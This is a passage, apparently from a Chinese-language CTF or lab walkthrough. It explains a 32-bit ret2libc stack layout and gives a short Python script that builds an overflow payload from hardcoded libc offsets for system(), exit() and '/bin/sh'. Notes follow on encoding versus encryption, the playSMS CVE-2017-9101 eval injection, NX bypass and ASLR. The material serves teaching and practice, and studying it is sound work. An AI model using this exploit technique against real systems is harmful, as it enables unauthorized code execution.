32 位 ret2libc 栈布局[填充 52 字节] [system() 地址] [exit() 地址] ["/bin/sh" 地址]。system() 覆盖返回地址，exit() 是 system 的返回地址，"/bin/sh" 是传给 system 的参数。

Exploit

# ga.py
import struct, sys

buf = b"A" * 52
libc = 0xb7e19000
system = struct.pack('<I', libc + 0x0003ada0)
exit_  = struct.pack('<I', libc + 0x0002e9d0)
sh     = struct.pack('<I', libc + 0x0015ba0b)

sys.stdout.buffer.write(buf + system + exit_ + sh)

知识点总结

编码 ≠ 加密。

Base64、Hex、Brainfuck、Ook! 都是可逆编码，不需要密钥。用编码"隐藏"敏感信息安全性为零。

playSMS CVE-2017-9101。

"Send from file" 的 CSV 第一列被 eval() 执行。

ret2libc：NX 开启时的经典绕过。

不在栈上放 shellcode，而是跳转到 libc 中已有的 system() 函数。32 位通过栈传参，64 位需要 ROP gadget 把参数放入 rdi 寄存器。

ASLR 关闭 = libc 地址固定。

多次运行 ldd 看地址是否变化。ASLR 开启时需要信息泄露绕过。
